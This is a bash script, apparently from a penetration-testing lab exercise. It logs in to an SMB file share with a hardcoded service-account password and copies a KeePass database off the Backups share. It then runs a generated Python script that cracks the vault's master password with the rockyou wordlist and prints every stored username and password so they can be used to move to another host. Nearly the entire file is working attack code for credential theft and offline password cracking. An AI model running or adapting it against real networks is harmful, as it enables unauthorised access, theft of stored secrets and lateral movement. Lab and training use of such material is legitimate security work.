#!/bin/bash
# =============================================================================
# M4.4 — KeePass database decrypt (CHARLIE -> OSCAR creds)  [VALIDATED]
# Grab passwords.kdbx from the Backups share, dictionary-crack it (KDBX4+AES-KDF),
# dump the OSCAR pivot credentials. Run FROM Kali as svc_helpdesk, tunnel up.
# NOTE: Kali's keepass2john cannot parse KDBX4-v40000; use a KDBX4-capable
# dictionary attack (pykeepass) — an up-to-date keepass2john/hashcat -m 13400 also works.
# =============================================================================
set -u
FS=10.3.30.20
USER='charlie.local/svc_helpdesk'
PASS='Chelsea1998'

echo "== grab passwords.kdbx from \\\\FS\\Backups =="
smbclient "//$FS/Backups" -U "$USER%$PASS" -c 'get passwords.kdbx /tmp/passwords.kdbx' 2>&1 | grep -iE "getting|NT_STATUS"

echo "== dictionary-crack (rockyou, KDBX4-capable) =="
pip install -q pykeepass --break-system-packages 2>/dev/null
gunzip -kf /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
cat > /tmp/kpbrute.py <<'PY'
import time
from pykeepass import PyKeePass
t=time.time(); n=0
for line in open("/usr/share/wordlists/rockyou.txt", encoding="latin-1"):
    pw=line.rstrip("\n"); n+=1
    try:
        kp=PyKeePass("/tmp/passwords.kdbx", password=pw)
        print("CRACKED after %d tries (%.0fs) -> master: %s" % (n, time.time()-t, pw))
        for e in kp.entries:
            print("  %-40s %s : %s" % (e.title, e.username, e.password))
        break
    except Exception:
        pass
PY
python3 /tmp/kpbrute.py
echo "M4.4 PASS: OSCAR pivot credentials recovered from the cracked vault."
